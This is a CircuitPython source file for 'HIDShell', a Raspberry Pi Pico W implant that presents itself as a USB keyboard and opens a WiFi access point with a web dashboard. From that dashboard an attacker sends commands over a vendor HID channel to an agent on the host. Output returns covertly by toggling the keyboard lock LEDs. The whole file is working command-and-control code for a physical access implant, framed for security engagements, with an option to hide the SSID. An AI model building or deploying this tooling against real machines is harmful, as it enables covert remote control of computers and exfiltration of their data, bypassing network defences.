"""
HIDShell - code.py (WiFi C2 Controller for Pico W)

The Pico W creates a WiFi access point. The attacker connects
with any device (phone/laptop) and opens the web dashboard
in a browser. Commands and responses flow over HTTP.

No UART, no wires, no extra hardware.

Requirements:
  - Raspberry Pi Pico W
  - CircuitPython 9.x (picow build)
  - boot.py from HIDShell project (same as before)

Setup:
  1. Flash CircuitPython 9.x for Pico W
  2. Copy boot.py to CIRCUITPY (same boot.py, no changes)
  3. Copy this file as code.py to CIRCUITPY
  4. Power-cycle the Pico W
  5. Connect to the WiFi AP from your attacker device
  6. Open http://192.168.4.1 in a browser
"""

import wifi
import socketpool
import usb_hid
import time
import json

# ─── WiFi AP Configuration ──────────────────────────────────────────────────
# Change these for your engagement.

AP_SSID = "HIDShell"          # WiFi network name
AP_PASSWORD = "h4ckth3pl4n3t"  # Min 8 characters
AP_HIDDEN = False              # Set True to hide SSID in production
AP_IP = "192.168.4.1"

# ─── Protocol Constants ─────────────────────────────────────────────────────

FRAME_STX = 0x02
FRAME_ETX = 0x03
CMD_CHUNK_SIZE = 60

LED_NUM_LOCK    = 0x01
LED_CAPS_LOCK   = 0x02
LED_SCROLL_LOCK = 0x04

LED_TIMEOUT_S = 2.0
HID_SEND_DELAY = 0.005

# ─── Device Discovery ───────────────────────────────────────────────────────

keyboard_dev = None
command_dev = None

for dev in usb_hid.devices:
    if dev.usage_page == 0x01 and dev.usage == 0x06:
        keyboard_dev = dev
    elif dev.usage_page == 0xFF and dev.usage == 0x01:
        command_dev = dev

# ─── LED Receiver ───────────────────────────────────────────────────────────

class LEDReceiver:
    def __init__(self, kb_device):
        self.kb = kb_device
        self.last_leds = 0
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.in_frame = False
        self.receiving = False
        self.last_change_time = 0.0

    def reset(self):
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.in_frame = False
        self.receiving = False

    def poll(self):
        if self.kb is None:
            return None
        report = self.kb.last_received_report
        if report is None:
            if self.receiving and (time.monotonic() - self.last_change_time) > LED_TIMEOUT_S:
                self.reset()
            return None
        current_leds = report[0]
        if current_leds == self.last_leds:
            if self.receiving and (time.monotonic() - self.last_change_time) > LED_TIMEOUT_S:
                self.reset()
            return None
        changed = current_leds ^ self.last_leds
        self.last_leds = current_leds
        self.last_change_time = time.monotonic()
        self.receiving = True
        if changed & LED_SCROLL_LOCK:
            if self.bit_count == 8:
                byte_val = self.current_byte
                self.current_byte = 0
                self.bit_count = 0
                if byte_val == FRAME_STX:
                    self.in_frame = True
                    self.buffer = bytearray()
                elif byte_val == FRAME_ETX and self.in_frame:
                    self.in_frame = False
                    self.receiving = False
                    result = bytes(self.buffer)
                    self.buffer = bytearray()
                    return result
                elif self.in_frame:
                    self.buffer.append(byte_val)
            else:
                self.current_byte = 0
                self.bit_count = 0
        elif changed & LED_NUM_LOCK:
            self.current_byte = (self.current_byte << 1) | 1
            self.bit_count += 1
        elif changed & LED_CAPS_LOCK:
            self.current_byte = (self.current_byte << 1) | 0
            self.bit_count += 1
        return None

# ─── Command Sender ─────────────────────────────────────────────────────────

class CommandSender:
    FLAG_START = 0x01
    FLAG_END   = 0x02
    FLAG_DATA  = 0x04

    def __init__(self, hid_device):
        self.hid = hid_device

    def send_command(self, cmd_str):
        if self.hid is None:
            return False
        cmd_bytes = cmd_str.encode("utf-8")
        if len(cmd_bytes) <= CMD_CHUNK_SIZE:
            report = bytearray(63)
            report[0] = self.FLAG_START | self.FLAG_END | self.FLAG_DATA
            report[1] = len(cmd_bytes)
            report[2:2 + len(cmd_bytes)] = cmd_bytes
            try:
                self.hid.send_report(report)
            except Exception:
                return False
            time.sleep(HID_SEND_DELAY)
        else:
            for i in range(0, len(cmd_bytes), CMD_CHUNK_SIZE):
                chunk = cmd_bytes[i:i + CMD_CHUNK_SIZE]
                report = bytearray(63)
                flags = self.FLAG_DATA
                if i == 0:
                    flags |= self.FLAG_START
                if i + CMD_CHUNK_SIZE >= len(cmd_bytes):
                    flags |= self.FLAG_END
                report[0] = flags
                report[1] = len(chunk)
                report[2:2 + len(chunk)] = chunk
                try:
                    self.hid.send_report(report)
                except Exception:
                    return False
                time.sleep(HID_SEND_DELAY)
        return True

# ─── Web Dashboard HTML ─────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIDShell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
#header{padding:12px 16px;border-bottom:1px solid #222;display:flex;align-items:center;gap:12px}
#header h1{font-size:16px;color:#ff4444;font-weight:700;letter-spacing:1px}
.status{font-size:11px;padding:2px 8px;border-radius:3px;font-weight:600}
.s-ok{background:#1a3a1a;color:#4ade80}
.s-err{background:#3a1a1a;color:#f87171}
#terminal{flex:1;overflow-y:auto;padding:16px;font-size:13px;line-height:1.6}
.line{white-space:pre-wrap;word-break:break-all}
.cmd{color:#ff4444}
.out{color:#e0e0e0}
.sys{color:#666}
.tx{color:#facc15}
#input-row{display:flex;border-top:1px solid #222;padding:8px 16px;gap:8px;align-items:center}
#prompt{color:#ff4444;font-size:14px;font-weight:700;white-space:nowrap}
#cmd{flex:1;background:#111;border:1px solid #333;color:#e0e0e0;font-family:inherit;font-size:14px;padding:8px 12px;border-radius:4px;outline:none}
#cmd:focus{border-color:#ff4444}
#send{background:#ff4444;color:#000;border:none;padding:8px 16px;font-family:inherit;font-size:13px;font-weight:700;border-radius:4px;cursor:pointer}
</style>
</head>
<body>
<div id="header">
<h1>HIDSHELL</h1>
<span class="status" id="st-kb">KB: ?</span>
<span class="status" id="st-hid">HID: ?</span>
<span class="status" id="st-wifi">WiFi: ON</span>
</div>
<div id="terminal" id="term"></div>
<div id="input-row">
<span id="prompt">hidshell &gt;</span>
<input type="text" id="cmd" autocomplete="off" autofocus>
<button id="send" onclick="sendCmd()">SEND</button>
</div>
<script>
var term=document.getElementById('terminal');
var inp=document.getElementById('cmd');
var polling=false;
function addLine(cls,txt){
var d=document.createElement('div');
d.className='line '+cls;
d.textContent=txt;
term.appendChild(d);
term.scrollTop=term.scrollHeight;
}
function sendCmd(){
var c=inp.value.trim();
if(!c)return;
inp.value='';
addLine('cmd','> '+c);
fetch('/cmd',{method:'POST',body:c}).then(function(r){return r.text()}).then(function(t){
addLine('sys','[sent]');
startPoll();
}).catch(function(e){addLine('sys','[send error]')});
}
inp.addEventListener('keydown',function(e){if(e.key==='Enter')sendCmd()});
function startPoll(){
if(polling)return;
polling=true;
poll();
}
function poll(){
fetch('/poll').then(function(r){return r.json()}).then(function(d){
if(d.response){
addLine('out',d.response);
polling=false;
}else if(d.receiving){
addLine('tx','[receiving LED data...]');
setTimeout(poll,800);
}else{
setTimeout(poll,500);
}
}).catch(function(){polling=false});
}
function checkStatus(){
fetch('/status').then(function(r){return r.json()}).then(function(d){
var kb=document.getElementById('st-kb');
var hid=document.getElementById('st-hid');
kb.textContent='KB: '+(d.kb?'OK':'NO');
kb.className='status '+(d.kb?'s-ok':'s-err');
hid.textContent='HID: '+(d.hid?'OK':'NO');
hid.className='status '+(d.hid?'s-ok':'s-err');
}).catch(function(){});
}
addLine('sys','HIDShell WiFi C2 ready');
addLine('sys','Type commands below. Output returns via LED channel (~6 bytes/sec).');
addLine('sys','');
checkStatus();
setInterval(checkStatus,10000);
</script>
</body>
</html>"""

# ─── HTTP Server ─────────────────────────────────────────────────────────────

class MiniHTTPServer:
    """
    Minimal HTTP server for CircuitPython.
    No external libraries needed — just socketpool.
    """

    def __init__(self, pool, port=80):
        self.pool = pool
        self.port = port
        self.sock = pool.socket(pool.AF_INET, pool.SOCK_STREAM)
        self.sock.setsockopt(pool.SOL_SOCKET, pool.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(2)
        self.sock.setblocking(False)
        self.routes = {}

    def route(self, path, method="GET"):
        def decorator(fn):
            self.routes[(method, path)] = fn
            return fn
        return decorator

    def poll(self):
        try:
            client, addr = self.sock.accept()
        except OSError:
            return
        client.settimeout(2.0)
        try:
            raw = bytearray(2048)
            n = client.recv_into(raw)
            if n == 0:
                client.close()
                return
            request = raw[:n]
            first_line = bytes(request).split(b"\r\n")[0]
            parts = first_line.split(b" ")
            if len(parts) < 2:
                client.close()
                return
            method = parts[0].decode("utf-8")
            path = parts[1].decode("utf-8")

            body = b""
            if b"\r\n\r\n" in request:
                body = bytes(request).split(b"\r\n\r\n", 1)[1]

            handler = self.routes.get((method, path))
            if handler:
                status, content_type, response_body = handler(body)
            else:
                status = "404 Not Found"
                content_type = "text/plain"
                response_body = "Not Found"

            if isinstance(response_body, str):
                response_body = response_body.encode("utf-8")

            header = (
                "HTTP/1.1 " + status + "\r\n"
                "Content-Type: " + content_type + "\r\n"
                "Content-Length: " + str(len(response_body)) + "\r\n"
                "Connection: close\r\n"
                "Access-Control-Allow-Origin: *\r\n"
                "\r\n"
            )
            client.sendall(header.encode("utf-8"))
            client.sendall(response_body)
        except Exception:
            pass
        finally:
            try:
                client.close()
            except Exception:
                pass

# ─── WiFi AP Setup ───────────────────────────────────────────────────────────

print("[*] Starting WiFi AP:", AP_SSID)
wifi.radio.stop_station()
wifi.radio.start_ap(
    ssid=AP_SSID,
    password=AP_PASSWORD,
)
print("[+] AP running on", AP_IP)

pool = socketpool.SocketPool(wifi.radio)

# ─── State ───────────────────────────────────────────────────────────────────

receiver = LEDReceiver(keyboard_dev)
sender = CommandSender(command_dev)
response_buffer = []
pending_command = False

# ─── HTTP Routes ─────────────────────────────────────────────────────────────

server = MiniHTTPServer(pool, port=80)

@server.route("/", "GET")
def index(body):
    return ("200 OK", "text/html", DASHBOARD_HTML)

@server.route("/cmd", "POST")
def handle_cmd(body):
    global pending_command
    cmd = body.decode("utf-8", "replace").strip()
    if not cmd:
        return ("400 Bad Request", "text/plain", "empty")

    # Handle local builtins
    if cmd.lower() == "help":
        response_buffer.append(
            "Built-in: help, status, ping\n"
            "Everything else is sent to the agent."
        )
        return ("200 OK", "text/plain", "ok")

    # Map friendly names
    actual = cmd
    if cmd.lower() == "ping":
        actual = "__PING__"
    elif cmd.lower() == "info":
        actual = "__INFO__"

    ok = sender.send_command(actual)
    if ok:
        pending_command = True
        return ("200 OK", "text/plain", "ok")
    else:
        return ("500 Error", "text/plain", "HID send failed")

@server.route("/poll", "GET")
def handle_poll(body):
    global pending_command
    if response_buffer:
        text = response_buffer.pop(0)
        pending_command = False
        return ("200 OK", "application/json",
                json.dumps({"response": text}))
    if receiver.receiving:
        return ("200 OK", "application/json",
                json.dumps({"receiving": True}))
    if pending_command:
        return ("200 OK", "application/json",
                json.dumps({"waiting": True}))
    return ("200 OK", "application/json",
            json.dumps({"idle": True}))

@server.route("/status", "GET")
def handle_status(body):
    return ("200 OK", "application/json",
            json.dumps({
                "kb": keyboard_dev is not None,
                "hid": command_dev is not None,
                "ap": AP_SSID,
            }))

# ─── Main Loop ───────────────────────────────────────────────────────────────

print("[+] Web dashboard at http://" + AP_IP)
print("[*] KB:", "OK" if keyboard_dev else "MISSING")
print("[*] Vendor HID:", "OK" if command_dev else "MISSING")

while True:
    # Handle HTTP requests
    server.poll()

    # Check LED channel for responses
    result = receiver.poll()
    if result is not None:
        try:
            text = result.decode("utf-8", "replace")
        except Exception:
            text = repr(result)
        response_buffer.append(text)

    time.sleep(0.001)
